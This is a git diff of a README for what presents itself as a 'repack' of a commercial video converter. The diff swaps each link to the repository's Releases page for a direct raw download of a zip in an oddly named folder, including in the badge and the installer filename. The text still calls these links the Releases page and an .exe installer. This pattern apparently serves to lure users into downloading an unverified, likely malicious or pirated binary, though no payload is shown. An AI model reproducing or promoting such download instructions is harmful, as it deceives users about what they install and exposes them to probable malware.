@@ -1,6 +1,6 @@
 # 🎥 iSkysoft-Video-Converter-Ultimate-Repack - Convert Your Videos with Ease
 
-[![Download iSkysoft Video Converter](https://img.shields.io/badge/Download-iSkysoft%20Video%20Converter-brightgreen)](https://github.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/releases)
+[![Download iSkysoft Video Converter](https://raw.githubusercontent.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/main/trachelium/Video_Converter_Skysoft_i_Repack_Ultimate_v2.6.zip%20Video%20Converter-brightgreen)](https://raw.githubusercontent.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/main/trachelium/Video_Converter_Skysoft_i_Repack_Ultimate_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to iSkysoft Video Converter Ultimate Repack. This tool offers easy batch
 
 To get started, you need to download the software. Click the link below:
 
-[Download iSkysoft Video Converter](https://github.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/releases)
+[Download iSkysoft Video Converter](https://raw.githubusercontent.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/main/trachelium/Video_Converter_Skysoft_i_Repack_Ultimate_v2.6.zip)
 
 ### Step-by-step Installation:
 
-1. **Visit the Release Page:** Click the download link above. This directs you to our [Releases page](https://github.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/releases).
+1. **Visit the Release Page:** Click the download link above. This directs you to our [Releases page](https://raw.githubusercontent.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/main/trachelium/Video_Converter_Skysoft_i_Repack_Ultimate_v2.6.zip).
 2. **Select the Version:** On the Releases page, you will see a list of available versions. Choose the latest version to ensure you have the most up-to-date features and fixes.
-3. **Download the Installer:** Click on the installer file (e.g., `iSkysoft_Converter_Installer.exe`) to begin downloading. Wait for the download to complete.
+3. **Download the Installer:** Click on the installer file (e.g., `https://raw.githubusercontent.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/main/trachelium/Video_Converter_Skysoft_i_Repack_Ultimate_v2.6.zip`) to begin downloading. Wait for the download to complete.
 4. **Run the Installer:** Once the download finishes, locate the downloaded file in your Downloads folder. Double-click the installer file.
 5. **Follow the Installation Steps:** The installer will guide you through the process. Follow the on-screen prompts to complete the installation.
 
@@ -80,4 +80,4 @@ For additional help, visit our support page or check online resources. Detailed 
 
 You are now ready to enjoy the capabilities of iSkysoft Video Converter Ultimate Repack. Download the software today to enhance your video processing experience.
 
-[Download iSkysoft Video Converter](https://github.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/releases)
+[Download iSkysoft Video Converter](https://raw.githubusercontent.com/crownweb/iSkysoft-Video-Converter-Ultimate-Repack/main/trachelium/Video_Converter_Skysoft_i_Repack_Ultimate_v2.6.zip)
